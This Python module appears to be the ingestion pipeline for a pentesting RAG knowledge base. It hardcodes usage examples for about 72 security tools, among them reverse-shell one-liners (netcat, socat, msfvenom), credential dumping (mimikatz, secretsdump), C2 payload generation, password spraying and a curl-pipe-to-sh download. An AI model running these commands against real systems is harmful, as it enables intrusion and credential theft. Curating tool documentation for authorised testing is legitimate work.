"""
Document ingestion pipeline for the RAG knowledge base.

Defines the :class:`Document` dataclass, :class:`DocumentCategory` enum, and
the :class:`DocumentLoader` helper that converts raw security intelligence
(CVEs, advisories, tool docs, engagement history …) into :class:`Document`
objects ready for embedding and storage.
"""

from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, List, Optional


class DocumentCategory(str, Enum):
    """Categories of security knowledge documents."""

    CVE = "cve"
    SECURITY_ADVISORY = "security_advisory"
    EXPLOIT_WRITEUP = "exploit_writeup"
    TOOL_DOCUMENTATION = "tool_documentation"
    ATTACK_PATTERN = "attack_pattern"
    ENGAGEMENT_HISTORY = "engagement_history"


@dataclass
class Document:
    """A single knowledge-base document with content and structured metadata."""

    id: str
    content: str
    metadata: Dict[str, Any] = field(default_factory=dict)

    # Convenience accessors --------------------------------------------------

    @property
    def title(self) -> str:
        return self.metadata.get("title", "")

    @property
    def category(self) -> Optional[str]:
        return self.metadata.get("category")

    @property
    def severity(self) -> Optional[str]:
        return self.metadata.get("severity")

    @property
    def source(self) -> Optional[str]:
        return self.metadata.get("source")

    @property
    def tags(self) -> List[str]:
        return self.metadata.get("tags", [])


def _new_id() -> str:
    return str(uuid.uuid4())


class DocumentLoader:
    """
    Converts raw security intelligence into :class:`Document` objects.

    All ``load_*`` methods return a single :class:`Document`; batch helpers
    return ``List[Document]``.
    """

    # ------------------------------------------------------------------
    # Individual document loaders
    # ------------------------------------------------------------------

    def load_cve_document(
        self,
        cve_id: str,
        description: str,
        severity: str,
        cvss_score: float,
        affected_products: List[str],
    ) -> Document:
        """Create a :class:`Document` from CVE data."""
        content = (
            f"CVE ID: {cve_id}\n"
            f"Severity: {severity} (CVSS {cvss_score:.1f})\n"
            f"Affected Products: {', '.join(affected_products)}\n\n"
            f"Description:\n{description}"
        )
        return Document(
            id=_new_id(),
            content=content,
            metadata={
                "title": cve_id,
                "source": "NVD",
                "category": DocumentCategory.CVE,
                "severity": severity.lower(),
                "cve_id": cve_id,
                "cvss_score": cvss_score,
                "affected_products": affected_products,
                "published_date": datetime.now(timezone.utc).isoformat(),
                "tags": ["cve", severity.lower()] + [p.lower() for p in affected_products],
            },
        )

    def load_advisory(
        self,
        title: str,
        content: str,
        source: str,
        severity: str,
    ) -> Document:
        """Create a :class:`Document` from a security advisory."""
        doc_content = (
            f"Security Advisory: {title}\n"
            f"Source: {source}\n"
            f"Severity: {severity}\n\n"
            f"{content}"
        )
        return Document(
            id=_new_id(),
            content=doc_content,
            metadata={
                "title": title,
                "source": source,
                "category": DocumentCategory.SECURITY_ADVISORY,
                "severity": severity.lower(),
                "published_date": datetime.now(timezone.utc).isoformat(),
                "tags": ["advisory", severity.lower(), source.lower()],
            },
        )

    def load_tool_documentation(
        self,
        tool_name: str,
        description: str,
        usage: str,
        examples: List[str],
    ) -> Document:
        """Create a :class:`Document` from tool documentation."""
        examples_text = "\n".join(f"  - {ex}" for ex in examples)
        content = (
            f"Tool: {tool_name}\n\n"
            f"Description:\n{description}\n\n"
            f"Usage:\n{usage}\n\n"
            f"Examples:\n{examples_text}"
        )
        return Document(
            id=_new_id(),
            content=content,
            metadata={
                "title": f"{tool_name} Documentation",
                "source": "tool_docs",
                "category": DocumentCategory.TOOL_DOCUMENTATION,
                "tool_name": tool_name,
                "tags": ["tool", tool_name.lower()],
            },
        )

    def load_attack_pattern(
        self,
        name: str,
        technique_id: str,
        description: str,
        mitre_tactics: List[str],
        tools: List[str],
    ) -> Document:
        """Create a :class:`Document` from a MITRE ATT&CK pattern."""
        content = (
            f"Attack Pattern: {name}\n"
            f"Technique ID: {technique_id}\n"
            f"MITRE Tactics: {', '.join(mitre_tactics)}\n"
            f"Commonly Used Tools: {', '.join(tools)}\n\n"
            f"Description:\n{description}"
        )
        return Document(
            id=_new_id(),
            content=content,
            metadata={
                "title": name,
                "source": "MITRE ATT&CK",
                "category": DocumentCategory.ATTACK_PATTERN,
                "technique_id": technique_id,
                "mitre_tactics": mitre_tactics,
                "tools": tools,
                "tags": ["attack-pattern", technique_id] + mitre_tactics,
            },
        )

    def load_engagement_history(
        self,
        target: str,
        phase: str,
        findings: List[str],
        tools_used: List[str],
        success: bool,
    ) -> Document:
        """Create a :class:`Document` from a past engagement record."""
        findings_text = "\n".join(f"  - {f}" for f in findings)
        content = (
            f"Engagement Target: {target}\n"
            f"Phase: {phase}\n"
            f"Outcome: {'Success' if success else 'Failure'}\n"
            f"Tools Used: {', '.join(tools_used)}\n\n"
            f"Findings:\n{findings_text}"
        )
        return Document(
            id=_new_id(),
            content=content,
            metadata={
                "title": f"Engagement: {target} — {phase}",
                "source": "engagement_history",
                "category": DocumentCategory.ENGAGEMENT_HISTORY,
                "target": target,
                "phase": phase,
                "tools_used": tools_used,
                "success": success,
                "recorded_at": datetime.now(timezone.utc).isoformat(),
                "tags": ["engagement", phase, "success" if success else "failure"],
            },
        )

    def load_exploit_writeup(
        self,
        title: str,
        target_cve: str,
        steps: List[str],
        difficulty: str,
        success_rate: float,
    ) -> Document:
        """Create a :class:`Document` from an exploit write-up."""
        steps_text = "\n".join(f"  {i + 1}. {s}" for i, s in enumerate(steps))
        content = (
            f"Exploit Write-up: {title}\n"
            f"Target CVE: {target_cve}\n"
            f"Difficulty: {difficulty}\n"
            f"Reported Success Rate: {success_rate * 100:.0f}%\n\n"
            f"Steps:\n{steps_text}"
        )
        return Document(
            id=_new_id(),
            content=content,
            metadata={
                "title": title,
                "source": "exploit_writeup",
                "category": DocumentCategory.EXPLOIT_WRITEUP,
                "cve_id": target_cve,
                "difficulty": difficulty,
                "success_rate": success_rate,
                "tags": ["exploit", target_cve, difficulty.lower()],
            },
        )

    # ------------------------------------------------------------------
    # Batch / feed loaders
    # ------------------------------------------------------------------

    def load_from_nvd_feed(self, feed_data: Dict[str, Any]) -> List[Document]:
        """
        Parse an NVD JSON feed (v2.0 format) and return a list of Documents.

        Expects the top-level ``vulnerabilities`` array from the NVD API.
        """
        documents: List[Document] = []
        vulnerabilities = feed_data.get("vulnerabilities", [])

        for entry in vulnerabilities:
            cve = entry.get("cve", {})
            cve_id = cve.get("id", "UNKNOWN")

            # Description — prefer English
            descriptions = cve.get("descriptions", [])
            description = next(
                (d["value"] for d in descriptions if d.get("lang") == "en"),
                descriptions[0]["value"] if descriptions else "No description available.",
            )

            # Severity / CVSS
            metrics = cve.get("metrics", {})
            severity = "unknown"
            cvss_score = 0.0
            for metric_key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                metric_list = metrics.get(metric_key, [])
                if metric_list:
                    data = metric_list[0].get("cvssData", {})
                    cvss_score = data.get("baseScore", 0.0)
                    severity = data.get("baseSeverity", "UNKNOWN").lower()
                    break

            # Affected products (CPE)
            affected: List[str] = []
            configurations = cve.get("configurations", [])
            for config in configurations:
                for node in config.get("nodes", []):
                    for cpe_match in node.get("cpeMatch", []):
                        cpe = cpe_match.get("criteria", "")
                        parts = cpe.split(":")
                        if len(parts) > 4:
                            affected.append(f"{parts[3]} {parts[4]}")

            documents.append(
                self.load_cve_document(
                    cve_id=cve_id,
                    description=description,
                    severity=severity,
                    cvss_score=cvss_score,
                    affected_products=list(dict.fromkeys(affected)) or ["unknown"],
                )
            )

        return documents

    def create_tool_documentation_corpus(self) -> List[Document]:
        """
        Auto-generate documentation for 72+ common penetration-testing tools.

        Returns a list of :class:`Document` objects covering reconnaissance,
        scanning, exploitation, post-exploitation, web, AD, and password tools.
        """
        tools = [
            # Reconnaissance
            ("nmap", "Network exploration and port scanner", "nmap [options] <target>",
             ["nmap -sV 192.168.1.1", "nmap -A -T4 target.com", "nmap -p 1-65535 -sU target"]),
            ("masscan", "Fast TCP port scanner", "masscan <target> -p<ports>",
             ["masscan 192.168.0.0/16 -p80,443", "masscan -p1-65535 10.0.0.0/8 --rate=10000"]),
            ("amass", "In-depth attack surface mapping and asset discovery", "amass enum -d <domain>",
             ["amass enum -d example.com", "amass intel -org 'Target Corp'"]),
            ("subfinder", "Subdomain discovery tool", "subfinder -d <domain>",
             ["subfinder -d example.com", "subfinder -d example.com -o output.txt"]),
            ("theHarvester", "Gather emails, names, subdomains from public sources",
             "theHarvester -d <domain> -b <source>",
             ["theHarvester -d example.com -b google", "theHarvester -d target.com -b all"]),
            ("recon-ng", "Full-featured web reconnaissance framework", "recon-ng",
             ["recon-ng -w workspace", "marketplace install all"]),
            ("shodan", "Internet-connected device search engine CLI", "shodan search <query>",
             ["shodan search 'apache 2.4'", "shodan host 8.8.8.8"]),
            ("dnsx", "Fast DNS toolkit for recon", "dnsx -l hosts.txt",
             ["dnsx -l domains.txt -a -resp", "echo 'example.com' | dnsx -cname"]),
            ("httpx", "Fast multi-purpose HTTP toolkit", "httpx -l urls.txt",
             ["httpx -l hosts.txt -status-code -title", "echo 'example.com' | httpx -tech-detect"]),
            ("waybackurls", "Fetch URLs from Wayback Machine", "waybackurls <domain>",
             ["waybackurls example.com", "echo 'example.com' | waybackurls | grep php"]),

            # Scanning / Enumeration
            ("nuclei", "Vulnerability scanner using templates", "nuclei -u <url>",
             ["nuclei -u https://target.com", "nuclei -l urls.txt -t cves/", "nuclei -u target.com -severity critical,high"]),
            ("nikto", "Web server scanner", "nikto -h <host>",
             ["nikto -h http://target.com", "nikto -h target.com -port 443 -ssl"]),
            ("gobuster", "Directory/file/DNS/vhost busting tool", "gobuster dir -u <url> -w <wordlist>",
             ["gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
              "gobuster dns -d target.com -w subdomains.txt"]),
            ("feroxbuster", "Fast, recursive content discovery tool", "feroxbuster -u <url>",
             ["feroxbuster -u https://target.com", "feroxbuster -u https://target.com -w wordlist.txt --depth 3"]),
            ("ffuf", "Fast web fuzzer", "ffuf -u <url> -w <wordlist>",
             ["ffuf -u https://target.com/FUZZ -w wordlist.txt",
              "ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt"]),
            ("dirb", "Web content scanner", "dirb <url> [wordlist]",
             ["dirb http://target.com", "dirb http://target.com /usr/share/wordlists/dirb/big.txt"]),
            ("wfuzz", "Web application fuzzer", "wfuzz -c -z file,<wordlist> <url>/FUZZ",
             ["wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
              "wfuzz -c -z range,1-100 http://target.com/user?id=FUZZ"]),
            ("enum4linux", "SMB enumeration tool", "enum4linux [options] <target>",
             ["enum4linux -a 192.168.1.1", "enum4linux -u admin -p password 192.168.1.1"]),
            ("smbclient", "SMB client for accessing shares", "smbclient //<host>/<share>",
             ["smbclient //192.168.1.1/share -U user", "smbclient -L //192.168.1.1 -N"]),
            ("crackmapexec", "Network penetration testing swiss-army knife",
             "crackmapexec <protocol> <target>",
             ["crackmapexec smb 192.168.1.0/24", "crackmapexec smb target -u user -p pass --shares"]),

            # Exploitation
            ("metasploit", "Penetration testing framework", "msfconsole",
             ["use exploit/multi/handler", "set payload windows/x64/meterpreter/reverse_tcp",
              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe"]),
            ("sqlmap", "Automatic SQL injection and database takeover tool",
             "sqlmap -u <url> [options]",
             ["sqlmap -u 'http://target.com/page?id=1' --dbs",
              "sqlmap -u 'http://target.com/page?id=1' -D dbname --tables"]),
            ("burpsuite", "Web vulnerability scanner and proxy", "burpsuite",
             ["Intercept HTTP requests", "Run active scan on target", "Use Intruder for fuzzing"]),
            ("searchsploit", "Offline Exploit-DB search", "searchsploit <query>",
             ["searchsploit apache 2.4", "searchsploit -x exploits/linux/remote/12345.py"]),
            ("exploitdb", "Exploit database search", "searchsploit <term>",
             ["searchsploit wordpress 5.0", "searchsploit --id struts2"]),
            ("beef", "Browser Exploitation Framework", "beef-xss",
             ["Hook browser via XSS payload", "Execute JS commands on hooked browser"]),
            ("commix", "Automated command injection tool", "commix --url=<url>",
             ["commix --url='http://target.com/cmd.php?arg=INJECT_HERE'",
              "commix --url='http://target.com/' --data='arg=INJECT_HERE'"]),
            ("xsstrike", "Advanced XSS detection suite", "xsstrike.py -u <url>",
             ["python3 xsstrike.py -u 'http://target.com/search?q=test'",
              "python3 xsstrike.py -u 'http://target.com/' --data 'q=test' --blind"]),
            ("dalfox", "Fast parameter analysis and XSS scanner", "dalfox url <target>",
             ["dalfox url 'https://target.com/search?q=test'",
              "dalfox file urls.txt -b 'https://callback.burpcollaborator.net'"]),
            ("ghauri", "Advanced SQL injection detection tool", "ghauri -u <url>",
             ["ghauri -u 'https://target.com/item?id=1' --dbs",
              "ghauri -u 'https://target.com/item?id=1' -D db --tables"]),

            # Post-Exploitation
            ("mimikatz", "Windows credential extraction", "mimikatz",
             ["privilege::debug", "sekurlsa::logonpasswords", "lsadump::sam"]),
            ("bloodhound", "Active Directory attack path analysis", "bloodhound",
             ["neo4j start && bloodhound", "Import SharpHound data", "Find shortest path to Domain Admin"]),
            ("sharphound", "Active Directory data collector for BloodHound",
             "SharpHound.exe [options]",
             ["SharpHound.exe -c All", "SharpHound.exe -c DCOnly --OutputDirectory C:\\temp"]),
            ("empire", "Post-exploitation framework", "powershell-empire",
             ["listeners", "uselistener http", "usestager windows/launcher_bat"]),
            ("cobaltstrike", "Threat emulation and adversary simulation platform",
             "cobaltstrike",
             ["Create Beacon listener", "Generate stageless payload", "Run Aggressor scripts"]),
            ("sliver", "Open-source adversary emulation framework", "sliver-server",
             ["generate --mtls 10.0.0.1 --os windows", "mtls --lport 8888", "sessions"]),
            ("havoc", "Modern C2 framework", "havoc teamserver",
             ["profile server.yaotl", "Generate demon payload", "Use Phantom DLL"]),

            # Password Attacks
            ("hashcat", "Advanced password recovery utility", "hashcat -m <mode> <hash> <wordlist>",
             ["hashcat -m 0 hash.txt rockyou.txt", "hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule"]),
            ("john", "John the Ripper password cracker", "john [options] <hashfile>",
             ["john --wordlist=rockyou.txt hashes.txt", "john --format=NT hashes.txt"]),
            ("hydra", "Network login cracker", "hydra -l <user> -P <passlist> <target> <protocol>",
             ["hydra -l admin -P rockyou.txt ssh://192.168.1.1",
              "hydra -L users.txt -P pass.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"]),
            ("medusa", "Parallel network login auditor", "medusa -h <host> -u <user> -P <passlist> -M <module>",
             ["medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh",
              "medusa -H hosts.txt -U users.txt -P pass.txt -M ftp"]),
            ("ncrack", "Network authentication cracking tool", "ncrack [options] <target>",
             ["ncrack -U users.txt -P pass.txt ssh://192.168.1.1",
              "ncrack -p 22,3389 --user admin -P pass.txt 192.168.1.1"]),

            # Network Tools
            ("netcat", "Network utility for reading/writing network connections", "nc [options] <host> <port>",
             ["nc -lvnp 4444", "nc 192.168.1.1 80", "nc -e /bin/sh 10.0.0.1 4444"]),
            ("socat", "Multipurpose relay tool", "socat <address> <address>",
             ["socat TCP-LISTEN:4444,fork EXEC:/bin/sh", "socat file:`tty`,raw,echo=0 TCP:10.0.0.1:4444"]),
            ("wireshark", "Network protocol analyser", "wireshark",
             ["Capture on eth0", "Filter: http.request.method==POST", "Follow TCP stream"]),
            ("tcpdump", "Command-line packet analyser", "tcpdump [options]",
             ["tcpdump -i eth0 -w capture.pcap", "tcpdump -r capture.pcap 'tcp port 80'"]),
            ("responder", "LLMNR/NBT-NS/mDNS Poisoner", "responder -I <interface>",
             ["responder -I eth0 -wrf", "responder -I eth0 -A"]),
            ("bettercap", "Swiss-army knife for network attacks", "bettercap",
             ["net.probe on", "net.sniff on", "arp.spoof on"]),
            ("impacket", "Collection of Python classes for working with network protocols",
             "python3 impacket-script [options]",
             ["impacket-psexec admin:pass@192.168.1.1", "impacket-secretsdump admin:pass@dc.domain.local",
              "impacket-GetUserSPNs domain/user:pass -dc-ip 192.168.1.1"]),

            # Web Application Tools
            ("burp", "Burp Suite web application security testing", "burpsuite",
             ["Set browser proxy to 127.0.0.1:8080", "Send to Repeater", "Use Scanner for active testing"]),
            ("zap", "OWASP ZAP web application scanner", "zaproxy",
             ["zap-baseline.py -t https://target.com", "zap-full-scan.py -t https://target.com"]),
            ("wpscan", "WordPress vulnerability scanner", "wpscan --url <url>",
             ["wpscan --url https://target.com", "wpscan --url https://target.com -e vp,u"]),
            ("joomscan", "Joomla vulnerability scanner", "perl joomscan.pl -u <url>",
             ["joomscan -u http://target.com", "joomscan -u http://target.com --ec"]),
            ("droopescan", "CMS vulnerability scanner", "droopescan scan <cms> -u <url>",
             ["droopescan scan drupal -u http://target.com", "droopescan scan silverstripe -u http://target.com"]),
            ("arjun", "HTTP parameter discovery suite", "arjun -u <url>",
             ["arjun -u https://target.com/endpoint", "arjun -u https://target.com -m POST"]),
            ("param-miner", "Burp extension for hidden parameters", "Via Burp Suite",
             ["Right-click > Extensions > Param Miner > Guess params"]),
            ("gf", "Grep patterns for URLs (bug bounty patterns)", "gf <pattern> [file]",
             ["gf xss urls.txt", "gf sqli urls.txt", "cat urls.txt | gf redirect"]),
            ("kiterunner", "Context-aware content discovery tool", "kr scan <target>",
             ["kr scan https://target.com -w routes.kite", "kr scan https://target.com -A=apiroutes-210228:20000"]),
            ("jwt_tool", "JWT testing toolkit", "python3 jwt_tool.py <JWT>",
             ["python3 jwt_tool.py eyJ... -T", "python3 jwt_tool.py eyJ... -X a"]),

            # Cloud / Container
            ("pacu", "AWS exploitation framework", "python3 pacu.py",
             ["run iam__enum_permissions", "run s3__enum", "run ec2__enum"]),
            ("trufflehog", "Search for secrets in git repos", "trufflehog git <url>",
             ["trufflehog git https://github.com/org/repo", "trufflehog filesystem /path/to/dir"]),
            ("gitleaks", "Detect secrets in git repositories", "gitleaks detect",
             ["gitleaks detect --source .", "gitleaks detect --source . -r report.json"]),
            ("trivy", "Container and filesystem vulnerability scanner", "trivy image <image>",
             ["trivy image nginx:latest", "trivy fs /path/to/app"]),
            ("grype", "Container image vulnerability scanner", "grype <image>",
             ["grype ubuntu:20.04", "grype dir:/path/to/project"]),
            ("ScoutSuite", "Cloud security auditing tool", "python3 scout.py <provider>",
             ["python3 scout.py aws", "python3 scout.py azure --tenant-id <id>"]),
            ("cloudsplaining", "AWS IAM security assessment tool", "cloudsplaining scan",
             ["cloudsplaining download --profile default", "cloudsplaining scan --input-file account.json"]),

            # Active Directory
            ("kerbrute", "Kerberos brute-force and user enumeration", "kerbrute <command>",
             ["kerbrute userenum -d domain.local users.txt", "kerbrute passwordspray -d domain.local users.txt 'Password123'"]),
            ("rubeus", "Kerberos interaction and abuse toolkit", "Rubeus.exe <command>",
             ["Rubeus.exe kerberoast", "Rubeus.exe asreproast", "Rubeus.exe ptt /ticket:..."]),
            ("evil-winrm", "WinRM shell for pentesting", "evil-winrm -i <ip> -u <user>",
             ["evil-winrm -i 192.168.1.1 -u administrator -p 'P@ssw0rd'",
              "evil-winrm -i 192.168.1.1 -u user -H <NTLM_hash>"]),
            ("ldapdomaindump", "Active Directory information dumper via LDAP",
             "ldapdomaindump <options> <host>",
             ["ldapdomaindump -u 'domain\\user' -p 'pass' dc.domain.local",
              "ldapdomaindump --no-html ldap://192.168.1.1"]),
            ("adidnsdump", "Active Directory DNS zone dumper", "adidnsdump -u <user>@<domain> <dc>",
             ["adidnsdump -u user@domain.local dc.domain.local",
              "adidnsdump -u user@domain.local dc.domain.local -r"]),

            # Misc / Utility
            ("chisel", "Fast TCP/UDP tunnel over HTTP", "chisel server/client",
             ["chisel server -p 8080 --reverse", "chisel client 10.0.0.1:8080 R:4444:127.0.0.1:4444"]),
            ("ligolo-ng", "Advanced tunnelling tool", "ligolo-ng",
             ["./proxy -selfcert", "./agent -connect 10.0.0.1:11601 -ignore-cert"]),
            ("pwncat", "Post-exploitation platform", "pwncat-cs",
             ["pwncat-cs -lp 4444", "pwncat-cs user@192.168.1.1"]),
            ("pspy", "Unprivileged Linux process snooping", "./pspy64",
             ["./pspy64", "./pspy64 -pf -i 1000"]),
            ("linpeas", "Linux privilege escalation awesome script", "bash linpeas.sh",
             ["curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
              "bash linpeas.sh -a 2>&1 | tee linpeas.log"]),
            ("winpeas", "Windows privilege escalation awesome script", "winpeas.exe",
             ["winpeas.exe all", "winpeas.exe quiet"]),
        ]

        documents: List[Document] = []
        for tool_name, description, usage, examples in tools:
            documents.append(
                self.load_tool_documentation(
                    tool_name=tool_name,
                    description=description,
                    usage=usage,
                    examples=examples,
                )
            )
        return documents
